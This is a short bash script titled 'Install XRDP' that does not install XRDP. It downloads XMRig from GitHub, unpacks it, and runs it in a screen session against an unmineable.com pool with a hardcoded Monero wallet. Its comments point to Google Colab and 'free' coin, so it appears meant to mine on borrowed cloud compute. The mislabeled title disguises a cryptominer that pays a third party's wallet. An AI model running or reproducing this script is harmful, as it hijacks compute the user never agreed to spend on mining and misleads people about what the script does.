#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig --donate-level 1 -o rx.unmineable.com:3333 -u XMR:8BnqztHLSCNF6pq3zT3Urqfptawq2WhSLAqD58GBzgn8HJJggHpTFGV9fh6jXdJMMmBXnQsoxo4VtKNYRfGWoj8z23t6qK8.BrunoMiner4 -p x -k -a rx/0
